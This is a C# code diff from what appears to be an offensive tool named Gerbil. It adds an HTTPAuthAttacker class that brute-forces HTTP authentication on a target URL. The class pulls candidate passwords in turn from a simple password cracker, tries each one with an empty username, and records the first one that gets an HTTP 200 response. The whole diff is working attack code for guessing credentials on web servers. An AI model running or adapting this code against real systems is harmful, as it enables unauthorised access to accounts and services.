@@ -7,6 +7,7 @@ using System.IO;
 using System.Net.Sockets;
 using System.Globalization;
 using System.Net;
+using Gerbil;
 
 namespace Gerbil
 {
@@ -75,6 +76,81 @@ namespace Gerbil
                 else if(attackerStatus ==  AttackerResult.FailedConnection)
                 {
                     throw new AttackerNoTargetFoundException();
+                }
+            }
+        }
+        public class HTTPAuthAttacker : Attacker
+        {
+            private string target;
+            private string foundPassword;
+            private PasswordServices.SimplePasswordCracker cracker;
+            
+            public HTTPAuthAttacker(string targetURI, int maxCrackLength)
+                : base()
+            {
+                target = targetURI;
+                cracker = new PasswordServices.SimplePasswordCracker(maxCrackLength);
+            }
+            public override AttackerResult stab()
+            {
+                bool authSuccessful = false;
+                string password;
+                try
+                {
+                    password = cracker.getNextKey();
+                }
+                catch (PasswordTableExhaustedException e)
+                {
+                    return AttackerResult.FailedAuth;
+                }
+                authSuccessful = httpLogin(target, "", password);
+                if(authSuccessful)
+                {
+                    foundPassword = password;
+                    return AttackerResult.Connected;
+                }
+                else
+                {
+                    return AttackerResult.Trying;
+                }
+            }
+            public string getAccessString()
+            {
+                return foundPassword;
+            }
+            private bool httpLogin(string url, string username, string password)
+            {
+                // create request
+                var request = (HttpWebRequest)WebRequest.Create(url);
+                request.Credentials = new NetworkCredential(username, password);
+
+                try
+                {
+                    // get response
+                    var response = (HttpWebResponse)request.GetResponse();
+                    var statusCode = response.StatusCode;
+
+                    // verify response
+                    if (statusCode == HttpStatusCode.OK)
+                    {
+                        return true;
+                    }
+                    else
+                    {
+                        return false;
+                    }
+                }
+                catch (WebException ex)
+                {
+                    if (((HttpWebResponse) ex.Response).StatusCode == HttpStatusCode.Unauthorized)
+                    {
+                        return false;
+                    }
+                    else
+                    {
+                        // TODO: Add new specific exception here
+                        throw new Exception();
+                    }
                 }
             }
         }
